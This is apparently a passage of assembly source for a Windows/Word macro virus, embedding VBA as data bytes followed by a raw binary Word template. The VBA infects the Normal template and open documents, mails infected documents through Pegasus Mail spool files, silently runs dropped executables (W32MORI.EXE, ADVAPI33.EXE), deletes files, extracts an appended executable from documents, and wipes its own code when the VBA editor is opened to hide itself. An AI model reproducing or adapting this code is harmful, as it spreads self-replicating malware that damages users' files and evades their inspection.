   db 'If mail_2 = "SY:0" Then GoTo no_mail',13,10
   db 'file_Ready:',13,10
   db 'random_1 = Second(Now)',13,10
   db 'Open pega_dir & "\mail\" & random_1 * random_1 & ".pmw" For Append As #3',13,10
   db 'Print #3, mail_1',13,10
   db 'Print #3, "SY:0"',13,10
   db 'Print #3, mail_4',13,10
   db 'Print #3, mail_5 & " :-)"',13,10
   db 'Print #3, "CC:"',13,10
   db 'Print #3, "EN:0"',13,10
   db 'Print #3, "CS:0"',13,10
   db 'Print #3, "RC:0"',13,10
   db 'Print #3, "DC:0"',13,10
   db 'Print #3, "UR:0"',13,10
   db 'Print #3, "SS:0"',13,10
   db 'Print #3, "SG:0"',13,10
   db 'Print #3, "MI:1"',13,10
   db 'Print #3, "ID:<Default>"',13,10
   db 'Print #3, "EX:0"',13,10
   db 'Print #3, "AT:" & active_doc; ",Binary,1"',13,10
   db 'Print #3, "RT: 1"',13,10
   db 'Print #3, "FL:0"',13,10
   db 'Print #3, ""',13,10
   db 'Print #3, random_message',13,10
   db 'Close #3',13,10
   db 'no_mail:',13,10
   db 'da_normal = Dir(NormalTemplate.FullName)',13,10
   db 'If da_normal = "" Then GoTo No_normal',13,10
   db 'SetAttr Act_norm.FullName, vbNormal',13,10
   db 'GoTo normal_exist',13,10
   db 'No_normal:',13,10
   db 'NormalTemplate.Save',13,10
   db 'normal_exist:',13,10
   db 'buffer = Space(255)',13,10
   db 'tempphuck = GetSystemDirectory(buffer, 255)',13,10
   db 'SystemDir = Left$(buffer, tempphuck)',13,10
   db 'windir = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "WinDrop")',13,10
   db 'If windir = "" Then windir = SystemDir',13,10
   db 'da_exe = windir & "\W32MORI.EXE"',13,10
   db 'If Dir(da_exe) = "" Then GoTo no_exec',13,10
   db 'Open da_exe for Input As #1',13,10
   db 'sanity_check = Input(2,1)',13,10
   db 'Close #1',13,10
   db 'If sanity_check <> "MZ" Then GoTo sanity_failed',13,10
   db 'Shell da_exe, vbHide',13,10
   db 'GoTo no_exec',13,10
   db 'sanity_failed:',13,10
   db 'Kill da_exe',13,10
   db 'no_exec:',13,10
   db 'If Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.CountOfLines > 150 Then normal_inf = 1',13,10
   db 'infect_doc:',13,10
   db 'If where_am_i = 0 Then GoTo in_document',13,10
   db 'Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'Set c = This_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'If Dir(windir & "\IMPMORI.DRV") <> "" Then GoTo imped_doc',13,10
   db 'Open windir & "\IMPMORI.DRV" For Output As #1',13,10
   db 'Print #1, This_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.lines(1, c.CountOfLines)',13,10
   db 'Close #1',13,10
   db 'imped_doc:',13,10
   db 'Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines',13,10
   db 'Act_doc.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (windir & "\IMPMORI.DRV")',13,10
   db 'ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.replaceline 11, "Private Sub Document_Open()"',13,10
   db 'ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.replaceline 12, "where_am_i = 0"',13,10
   db 'ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.replaceline 204,"Sub ToolsMacro()"',13,10
   db 'ActiveDocument.Save',13,10
   db 'del_temp = 0',13,10
   db 'del_doc = 0',13,10
   db 'the_doc = ActiveDocument.FullName',13,10
   db 'If Dir("c:\morishad.tmp") = "" Then del_temp = 1',13,10
   db 'If Dir(windir & "\Normal.doc") = "" Then del_doc = 1',13,10
   db 'If del_temp = 1 Then GoTo del_doce',13,10
   db 'Kill "c:\morishad.tmp"',13,10
   db 'del_doce:',13,10
   db 'If del_doc = 1 Then GoTo no_del',13,10
   db 'Kill windir & "\Normal.doc"',13,10
   db 'no_del:',13,10
   db 'Open "c:\morishad.tmp" For Output As #1',13,10
   db 'Print #1, the_doc',13,10
   db 'Close #1',13,10
   db 'ActiveDocument.SaveAs (windir & "\Normal.doc")',13,10
   db 'Open "c:\morishad.tmp" For Input As #1',13,10
   db 'Line Input #1, orig_doc',13,10
   db 'Close #1',13,10
   db 'x = 0',13,10
   db 'looper:',13,10
   db 'x = x + 1',13,10
   db 'If x < 10000 Then GoTo looper',13,10
   db 'exe_source = windir & "\ADVAPI33.EXE"',13,10
   db 'If Dir(exe_source) = "" Then GoTo no_packed',13,10
   db 'Shell exe_source & " " & orig_doc, vbHide',13,10
   db 'no_packed:',13,10
   db 'Kill "c:\morishad.tmp"',13,10
   db 'GoTo no_active',13,10
   db 'in_document:',13,10
   db 'infect_normal:',13,10
   db 'If normal_inf = 1 Then GoTo no_inf',13,10
   db 'Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'Set c = This_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'If Dir(windir & "\IMPMORI.DRV") <> "" Then GoTo imped_norm',13,10
   db 'Open windir & "\IMPMORI.DRV" For Output As #1',13,10
   db 'Print #1, This_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.lines(1, c.CountOfLines)',13,10
   db 'Close #1',13,10
   db 'imped_norm:',13,10
   db 'Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines',13,10
   db 'Act_norm.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (windir & "\IMPMORI.DRV")',13,10
   db 'NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.replaceline 11, "Private Sub Document_Close()"',13,10
   db 'NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.replaceline 12, "where_am_i = 1"',13,10
   db 'NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.replaceline 204, "Sub ViewVBCode()"',13,10
   db "NormalTemplate.Save",13,10
   db 'no_inf:',13,10
   db 'If Dir("C:\Normal.doc") = "" Then del_root = 1',13,10
   db 'If del_root = 1 Then GoTo no_root',13,10
   db "On error resume next",13,10
   db 'Kill "C:\Normal.doc"',13,10
   db 'Kill "C:\impmori.drv"',13,10
   db 'Kill "C:\w32mori.exe"',13,10
   db "no_root:",13,10
   db 'da_doc = ActiveDocument.FullName',13,10
   db 'da_exe = windir & "\W32MORI.EXE"',13,10
   db 'If da_doc = "" Then GoTo no_active',13,10
   db 'If Dir(da_exe) = "" Then GoTo no_dropper',13,10
   db 'Open da_exe for Input As #1',13,10
   db 'sanity_check = Input(2,1)',13,10
   db 'Close #1',13,10
   db 'If sanity_check = "MZ" Then GoTo no_active',13,10
   db 'Kill da_exe',13,10
   db "no_dropper:",13,10
   db 'h = OpenFile(da_doc, 0)',13,10
   db 'p = GlobalAlloc(0, 150000)',13,10
   db 's = GetFileSize(h, 0)',13,10
   db 'If s < 150000 Then GoTo no_good',13,10
   db 's = s - 132096',13,10
   db 'SeekFile h, s, 0',13,10
   db 'ReadFile h, p, 132096',13,10
   db 'CloseFile h',13,10
   db 'h = CreateFile(da_exe, 0)',13,10
   db 'WriteFile h, p, 132096',13,10
   db "no_good:",13,10
   db 'CloseFile h',13,10
   db 'GlobalFree (p)',13,10
   db 'no_active:',13,10
   db 'End Sub',13,10
   db 'Sub ViewVBCode()',13,10
   db 'On Error GoTo no_doc_stealth',13,10
   db 'If ActiveDocument = "" Then GoTo no_doc_stealth',13,10
   db 'Dim Act_doc As Object: Set Act_doc = ActiveDocument',13,10
   db 'Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines',13,10
   db 'Act_doc.Saved = True',13,10
   db 'no_doc_stealth:',13,10
   db 'Dim Act_norm As Object: Set Act_norm = NormalTemplate',13,10
   db 'Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule',13,10
   db 'Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines',13,10
   db 'Act_norm.Saved = True',13,10
   db 'Application.ShowVisualBasicEditor = True',13,10
   db 'End Sub',13,10
   macro_code_end:

   macro_code_len equ macro_code_end-macro_code_start

   normal_start:
    db 0d0h, 0cfh, 011h, 0e0h, 0a1h, 0b1h, 01ah, 0e1h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 03eh, 000h, 003h, 000h, 0feh, 0ffh, 009h, 000h, 006h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 001h, 000h, 000h, 000h
    db 021h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 010h, 000h, 000h
    db 023h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 020h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ech, 0a5h, 0c1h, 000h
    db 039h, 020h, 01dh, 004h, 000h, 000h, 0f1h, 012h, 0bfh, 000h, 000h, 000h
    db 000h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 000h, 004h, 000h, 000h
    db 001h, 004h, 000h, 000h, 00eh, 000h, 062h, 06ah, 062h, 06ah, 0fdh, 0cfh
    db 0fdh, 0cfh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 01dh, 004h, 016h, 000h
    db 02eh, 00ch, 000h, 000h, 09fh, 0a5h, 000h, 000h, 09fh, 0a5h, 000h, 000h
    db 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 00fh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 00fh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 00fh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 06ch, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h, 000h, 000h, 0aeh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h, 000h, 000h, 014h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0e2h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0e2h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0e2h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0e2h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0e2h, 000h, 000h, 000h, 00ch, 000h
    db 000h, 000h, 0eeh, 000h, 000h, 000h, 00ch, 000h, 000h, 000h, 0e2h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0ach, 002h, 000h, 000h, 0b6h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 066h, 001h, 000h, 000h, 0c7h, 000h
    db 000h, 000h, 02dh, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 02dh, 002h
    db 000h, 000h, 000h, 000h, 000h, 000h, 02dh, 002h, 000h, 000h, 000h, 000h
    db 000h, 000h, 02dh, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 02dh, 002h
    db 000h, 000h, 000h, 000h, 000h, 000h, 02dh, 002h, 000h, 000h, 024h, 000h
    db 000h, 000h, 062h, 003h, 000h, 000h, 020h, 002h, 000h, 000h, 082h, 005h
    db 000h, 000h, 04ah, 000h, 000h, 000h, 051h, 002h, 000h, 000h, 015h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 051h, 002h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 066h, 002h, 000h, 000h, 016h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 066h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 066h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 060h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 066h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 066h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 0fah, 000h
    db 000h, 000h, 00ch, 000h, 000h, 000h, 040h, 0afh, 062h, 0afh, 065h, 0b4h
    db 0bfh, 001h, 0e2h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0e2h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 066h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 066h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 07ch, 002h, 000h, 000h, 030h, 000h, 000h, 000h, 0ach, 002h
    db 000h, 000h, 000h, 000h, 000h, 000h, 066h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0cch, 005h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0cch, 005h, 000h, 000h, 000h, 000h
    db 000h, 000h, 066h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 006h, 001h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0c2h, 000h, 000h, 000h, 012h, 000h
    db 000h, 000h, 0d4h, 000h, 000h, 000h, 00eh, 000h, 000h, 000h, 0aeh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0aeh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0aeh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 002h, 000h, 0d9h, 000h, 000h, 000h
    db 00dh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 004h, 000h, 000h
    db 001h, 004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
